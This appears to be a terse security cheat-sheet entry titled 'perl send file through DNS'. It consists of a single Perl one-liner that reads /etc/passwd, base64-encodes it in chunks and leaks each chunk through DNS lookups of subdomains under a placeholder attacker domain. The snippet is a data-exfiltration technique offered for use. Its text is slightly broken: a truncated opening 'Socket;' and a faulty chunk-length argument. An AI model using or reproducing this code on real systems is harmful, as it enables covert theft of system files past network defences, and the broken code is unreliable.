# sec

+ **perl** send file through DNS

```
Socket;use MIME::Base64;sub x{$z=shift;for($i=0;$i<length($z);$i+=45){$x=encode_base64(substr($z,$i,$i+45),'');gethostbyname($x.".dom.tld");}} open(f,"/etc/passwd");while(<f>){x($_)}
```
